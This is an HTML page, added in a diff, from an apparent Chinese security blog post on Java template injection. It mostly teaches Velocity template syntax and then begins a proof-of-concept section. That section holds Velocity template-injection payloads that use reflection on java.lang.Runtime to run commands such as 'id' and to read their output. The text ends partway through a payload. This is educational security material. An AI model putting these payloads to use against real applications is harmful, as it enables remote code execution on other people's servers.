@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
+    <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Velocity的简介Velocity模板引擎, 作为一款成熟的基于java的模板引擎，能够帮我们实现页面静态化，同时它将Java代码与网页分开，将模板和填入数据整合,生成我们需要的页面. 1 基本语法1 关键字Velocity模板中的关键字, 都是以#开头表示的  #set 设置一个变量 #if 条件分支判断 #else 另一个条件分支 #end 语句结束 #foreach 循环语句  2 变量">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java模版注入">
+<meta property="og:url" content="https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
+<meta property="og:description" content="Velocity的简介Velocity模板引擎, 作为一款成熟的基于java的模板引擎，能够帮我们实现页面静态化，同时它将Java代码与网页分开，将模板和填入数据整合,生成我们需要的页面. 1 基本语法1 关键字Velocity模板中的关键字, 都是以#开头表示的  #set 设置一个变量 #if 条件分支判断 #else 另一个条件分支 #end 语句结束 #foreach 循环语句  2 变量">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-12-30T05:44:38.000Z">
+<meta property="article:modified_time" content="2025-03-05T07:24:36.793Z">
+<meta property="article:author" content="Oceanzbz">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="注入">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java模版注入</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-QWTJSPQL4F');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Jndi%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&text=Java模版注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&title=Java模版注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&is_video=false&description=Java模版注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java模版注入&body=Check out this article: https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&title=Java模版注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&title=Java模版注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&title=Java模版注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&title=Java模版注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&name=Java模版注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&t=Java模版注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Velocity%E7%9A%84%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">Velocity的简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">1 基本语法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.1.1.</span> <span class="toc-text">1 关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8F%98%E9%87%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">2 变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6%E5%92%8C%E9%80%BB%E8%BE%91%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">1.1.3.</span> <span class="toc-text">3 转义字符和逻辑操作符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%BE%AA%E7%8E%AF"><span class="toc-number">1.1.4.</span> <span class="toc-text">4 循环</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.5.</span> <span class="toc-text">5 条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%B3%A8%E9%87%8A"><span class="toc-number">1.1.6.</span> <span class="toc-text">6 注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E5%BC%95%E5%85%A5%E8%B5%84%E6%BA%90"><span class="toc-number">1.1.7.</span> <span class="toc-text">7 引入资源</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81POC"><span class="toc-number">1.2.</span> <span class="toc-text">常见POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#evaluate%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">evaluate例子：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#merage"><span class="toc-number">1.2.2.</span> <span class="toc-text">merage:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FreeMarker%E7%AE%80%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">FreeMarker简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FreeMarker%E8%AF%AD%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">FreeMarker语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FreeMarker%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">FreeMarker常用语法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#if%E6%8C%87%E4%BB%A4"><span class="toc-number">2.2.1.</span> <span class="toc-text">if指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#list%E6%8C%87%E4%BB%A4"><span class="toc-number">2.2.2.</span> <span class="toc-text">list指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%81%8D%E5%8E%86Map"><span class="toc-number">2.2.3.</span> <span class="toc-text">遍历Map</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E5%80%BC%E5%A4%84%E7%90%86"><span class="toc-number">2.2.4.</span> <span class="toc-text">空值处理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FreeMarker%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">FreeMarker注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.1.</span> <span class="toc-text">内置函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#new"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">new</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#API"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">API</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E4%BA%9Bpoc1"><span class="toc-number">2.3.1.3.</span> <span class="toc-text">一些poc1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87class-getClassloader%E5%8F%8D%E5%B0%84%E5%8A%A0%E8%BD%BDExecute%E7%B1%BB"><span class="toc-number">2.3.1.4.</span> <span class="toc-text">绕过class.getClassloader反射加载Execute类</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Thymeleaf"><span class="toc-number">3.</span> <span class="toc-text">Thymeleaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">语法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE"><span class="toc-number">3.1.1.</span> <span class="toc-text">标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.2.</span> <span class="toc-text">链接表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.3.</span> <span class="toc-text">变量表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E5%8F%98%E9%87%8F%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.4.</span> <span class="toc-text">选择变量表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.5.</span> <span class="toc-text">消息表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%87%E6%AE%B5%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.6.</span> <span class="toc-text">片段表达式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thymeleaf-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">Thymeleaf 模板注入漏洞</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java模版注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Oceanzbz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-30T05:44:38.000Z" class="dt-published" itemprop="datePublished">2024-12-30</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/SSTI/" rel="tag">SSTI</a>, <a class="p-category" href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag">注入</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Velocity的简介"><a href="#Velocity的简介" class="headerlink" title="Velocity的简介"></a>Velocity的简介</h2><p>Velocity模板引擎, 作为一款成熟的基于java的模板引擎，能够帮我们实现页面静态化，同时它将Java代码与网页分开，将模板和填入数据整合,生成我们需要的页面.</p>
+<h3 id="1-基本语法"><a href="#1-基本语法" class="headerlink" title="1 基本语法"></a>1 基本语法</h3><h4 id="1-关键字"><a href="#1-关键字" class="headerlink" title="1 关键字"></a>1 关键字</h4><p>Velocity模板中的关键字, 都是以#开头表示的</p>
+<ul>
+<li>#set 设置一个变量</li>
+<li>#if 条件分支判断</li>
+<li>#else 另一个条件分支</li>
+<li>#end 语句结束</li>
+<li>#foreach 循环语句</li>
+</ul>
+<h4 id="2-变量"><a href="#2-变量" class="headerlink" title="2 变量"></a>2 变量</h4><p>Velocity模板中的变量, 都是以$开头表示的</p>
+<p>如: $user用户 $password 用户密码</p>
+<p><strong>{}变量</strong></p>
+<p>对于明确的Velocity变量, 可以使用{}包括起来, 可以在页面上展示如下效果:</p>
+<p>${user}Name, 此时页面上可以表示为$someoneName的效果.</p>
+<p><strong>!变量</strong></p>
+<p>如上述内容,Velocity模板中如果变量不存在, 在页面会显示$user, 这种形式影响展示的效果. 可以使用$!user表示.</p>
+<p>$!user表示, 存在则展示,不存在则为空白</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码## 定义一个user变量为李白, password变量为<span class="number">123456</span> </span><br><span class="line">#set&#123;$user = <span class="string">&quot;李白&quot;</span>&#125;</span><br><span class="line">#set&#123;$password = <span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">## 变量引用</span><br><span class="line">#set&#123;$student.name = <span class="string">&quot;李白&quot;</span>&#125;</span><br><span class="line">## 数字</span><br><span class="line">#set&#123;$student.age = <span class="number">22</span>&#125;</span><br><span class="line">## 字符串</span><br><span class="line">#set&#123;$student.class = <span class="string">&quot;大班&quot;</span>&#125;</span><br><span class="line">## 属性引用  </span><br><span class="line">#set($student.address = $address.info)</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-转义字符和逻辑操作符"><a href="#3-转义字符和逻辑操作符" class="headerlink" title="3 转义字符和逻辑操作符"></a>3 转义字符和逻辑操作符</h4><p>Velocity模板中转义字符是 \</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#set&#123;$user = <span class="string">&quot;李白&quot;</span>&#125;</span><br><span class="line">## 输入		结果</span><br><span class="line">$user		 李白</span><br><span class="line">\$user		 $user</span><br><span class="line">\\$user		 \李白</span><br><span class="line">\\\$user	 \$user</span><br></pre></td></tr></table></figure>
+
+<p>&amp;&amp; 且</p>
+<p>|| 或</p>
+<p>! 取反</p>
+<h4 id="4-循环"><a href="#4-循环" class="headerlink" title="4 循环"></a>4 循环</h4><p>Velocity模板中list集合循环语法</p>
+<p>循环遍历,可以得到每个元素,每个元素的序号,以及总的集合长度</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#foreach ( $element in $list)</span><br><span class="line">## 集合中每个元素</span><br><span class="line">$element</span><br><span class="line">## 集合的序号 从<span class="number">1</span>开始</span><br><span class="line">$&#123;velocityCount&#125;</span><br><span class="line">## 集合的长度</span><br><span class="line">$&#123;list.size()&#125;</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
+
+<p>map集合循环语法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#foreach ($entry in $map.entrySet())</span><br><span class="line">## map的key   map的value值</span><br><span class="line">$entry.key =&gt; $entry.value</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-条件"><a href="#5-条件" class="headerlink" title="5 条件"></a>5 条件</h4><p>Velocity模板中条件语法if-ifelse-else结构</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#<span class="keyword">if</span> (condition1)</span><br><span class="line"><span class="comment">// 执行业务</span></span><br><span class="line">#elseif (condition2)</span><br><span class="line"><span class="comment">// 执行业务</span></span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line"><span class="comment">// 执行业务</span></span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
+
+<p>常用的条件语句是if-else结构</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#<span class="keyword">if</span> (condition1)</span><br><span class="line"><span class="comment">// 执行业务</span></span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line"><span class="comment">// 执行业务</span></span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
+
+<p><strong>#break</strong></p>
+<p>表示跳出循环</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#<span class="keyword">if</span> (condition1)</span><br><span class="line">## 条件符合跳过</span><br><span class="line">#<span class="keyword">if</span>($user == <span class="string">&quot;李白&quot;</span>)</span><br><span class="line">    #<span class="keyword">break</span>;</span><br><span class="line">    #end</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line"><span class="comment">// 执行业务</span></span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
+
+<p><strong>#stop</strong></p>
+<p>表示终止指令,终止模板解析</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#<span class="keyword">if</span> (condition1)</span><br><span class="line">## 条件符合直接终止</span><br><span class="line">#<span class="keyword">if</span>($user == <span class="string">&quot;李白&quot;</span>)</span><br><span class="line">    #stop</span><br><span class="line">    #end</span><br><span class="line">    #<span class="keyword">else</span></span><br><span class="line">    <span class="comment">// 执行业务</span></span><br><span class="line">    #end</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-注释"><a href="#6-注释" class="headerlink" title="6 注释"></a>6 注释</h4><p>单行注释 ##</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码## 定义一个user变量为李白</span><br><span class="line">#set&#123;$user = <span class="string">&quot;李白&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>多行注释 #* *#</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#*  </span><br><span class="line">定义一个user变量</span><br><span class="line">将user变量赋值为 李白</span><br><span class="line">*#</span><br><span class="line">#set&#123;$user = <span class="string">&quot;李白&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>文档注释 #** *#</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码 #** </span><br><span class="line"><span class="meta">@version</span> <span class="number">1.1</span></span><br><span class="line"><span class="meta">@author</span>  李白</span><br><span class="line">*#</span><br><span class="line">#set&#123;$user = <span class="string">&quot;李白&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-引入资源"><a href="#7-引入资源" class="headerlink" title="7 引入资源"></a>7 引入资源</h4><p><strong>#include</strong></p>
+<p>表示引入外部资源，引入的资源不被引擎所解析</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#include( <span class="string">&quot;one.gif&quot;</span>,<span class="string">&quot;two.txt&quot;</span>,<span class="string">&quot;three.htm&quot;</span> )</span><br></pre></td></tr></table></figure>
+
+<p><strong>#parse</strong></p>
+<p>用于导入脚本, 引入的资源会被引擎所解析</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码##  a.vm文件</span><br><span class="line">#set($user = <span class="string">&quot;李白&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## b.vm文件</span><br><span class="line">#parse(<span class="string">&quot;a.vm&quot;</span>)</span><br><span class="line">## 变量   值</span><br><span class="line">$user	  李白</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见POC"><a href="#常见POC" class="headerlink" title="常见POC"></a>常见POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 命令执行1</span></span><br><span class="line">#set($e=<span class="string">&quot;e&quot;</span>)</span><br><span class="line">$e.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;open -a Calculator&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 命令执行2 </span></span><br><span class="line">#set($x=<span class="string">&#x27;&#x27;</span>)##</span><br><span class="line">#set($rt = $x.class.forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>))##</span><br><span class="line">#set($chr = $x.class.forName(<span class="string">&#x27;java.lang.Character&#x27;</span>))##</span><br><span class="line">#set($str = $x.class.forName(<span class="string">&#x27;java.lang.String&#x27;</span>))##</span><br><span class="line">#set($ex=$rt.getRuntime().exec(<span class="string">&#x27;id&#x27;</span>))##</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())##</span><br><span class="line">#foreach( $i in [<span class="number">1.</span>.$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br><span class="line"></span><br><span class="line"><span class="comment">// 命令执行3</span></span><br><span class="line">#set ($e=<span class="string">&quot;exp&quot;</span>)</span><br><span class="line">#set ($a=$e.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec($cmd))</span><br><span class="line">#set ($input=$e.getClass().forName(<span class="string">&quot;java.lang.Process&quot;</span>).getMethod(<span class="string">&quot;getInputStream&quot;</span>).invoke($a))</span><br><span class="line">#set($sc = $e.getClass().forName(<span class="string">&quot;java.util.Scanner&quot;</span>))</span><br><span class="line">#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(<span class="string">&quot;java.io.InputStream&quot;</span>)))</span><br><span 